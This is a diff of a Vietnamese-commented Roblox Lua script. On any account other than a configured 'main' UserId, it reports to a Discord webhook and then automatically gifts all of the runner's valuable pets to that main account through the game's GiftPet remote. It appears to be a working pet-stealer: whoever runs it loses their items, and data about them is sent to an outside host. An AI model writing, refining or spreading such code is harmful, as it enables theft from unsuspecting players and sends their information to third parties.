@@ -1,3 +1,6 @@
+getgenv().id = "12345678" -- Thay bằng UserId acc chính
+getgenv().webhook = "https://discord.com/api/webhooks/..." -- Thay bằng webhook của bạn
+
 print("✅ Script đang khởi động...")
 
 local Players = game:GetService("Players")
@@ -19,7 +22,7 @@ local PET_NAMES = {
     "Butterfly", "Dragon Fly", "Queen Bee", "Disco Bee"
 }
 
--- 🔎 Tìm acc chính trong server
+-- 🔍 Tìm acc chính trong server
 local function getMainPlayer()
     for _, p in ipairs(Players:GetPlayers()) do
         if p.UserId == MAIN_USER_ID then
@@ -29,18 +32,17 @@ local function getMainPlayer()
     return nil
 end
 
--- 🐾 Lấy danh sách pet trong backpack/character
+-- 🐾 Lấy danh sách pet đúng
 local function getValidPetTools()
     local pets = {}
     for _, container in ipairs({LocalPlayer:FindFirstChild("Backpack"), LocalPlayer.Character}) do
         if container then
             for _, tool in ipairs(container:GetChildren()) do
                 if tool:IsA("Tool") then
-                    -- Tách tên chính từ phần [x]
-                    local baseName = tool.Name:split(" [")[1]
+                    local toolNameLower = string.lower(tool.Name)
                     for _, pet in ipairs(PET_NAMES) do
-                        if baseName == pet then
-                            table.insert(pets, {tool = tool, name = baseName})
+                        if toolNameLower:sub(1, #pet):lower() == pet:lower() then
+                            table.insert(pets, {tool = tool, name = pet})
                             break
                         end
                     end
@@ -51,13 +53,13 @@ local function getValidPetTools()
     return pets
 end
 
--- 🤝 Gift pet
+-- 🎁 Gửi pet
 local function giftPetTo(player, petName)
     local giftRemote = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("GiftPet")
     giftRemote:FireServer(player, petName)
 end
 
--- 👣 Di chuyển đến người chơi
+-- 👣 Di chuyển lại gần
 local function moveToPlayer(target)
     local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
     local tgt = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
@@ -70,11 +72,11 @@ local function moveToPlayer(target)
     end
 end
 
--- 🎁 Tự động gift toàn bộ pet
+-- 🤖 Auto gift toàn bộ pet
 local function autoGiftAllPets(mainPlayer)
     local pets = getValidPetTools()
     if #pets == 0 then
-        print("❌ Không có pet để gift.")
+        warn("❌ Không có pet để gift.")
         return
     end
 
@@ -90,7 +92,7 @@ local function autoGiftAllPets(mainPlayer)
     end
 end
 
--- 🌐 Gửi thông tin về webhook
+-- 🌐 Gửi embed webhook
 local function sendWebhook()
     if WEBHOOK_URL == "" then return end
 
@@ -133,23 +135,19 @@ local function sendWebhook()
     end
 end
 
--- 🧠 Luồng chính
+-- 🧠 Khởi động
 task.spawn(function()
     task.wait(2)
 
     if LocalPlayer.UserId ~= MAIN_USER_ID then
         sendWebhook()
 
-        local function tryGift()
-            local main = getMainPlayer()
-            if main then
-                autoGiftAllPets(main)
-            else
-                warn("⏳ Chưa thấy acc chính, đang chờ...")
-            end
+        local main = getMainPlayer()
+        if main then
+            autoGiftAllPets(main)
+        else
+            print("⏳ Chưa thấy acc chính trong server.")
         end
-
-        tryGift()
 
         Players.PlayerAdded:Connect(function(p)
             if p.UserId == MAIN_USER_ID then
@@ -158,6 +156,6 @@ task.spawn(function()
             end
         end)
     else
-        print("⛔ Đây là account chính, không gift.")
+        print("⛔ Đây là account chính, không tự động gift.")
     end
 end)
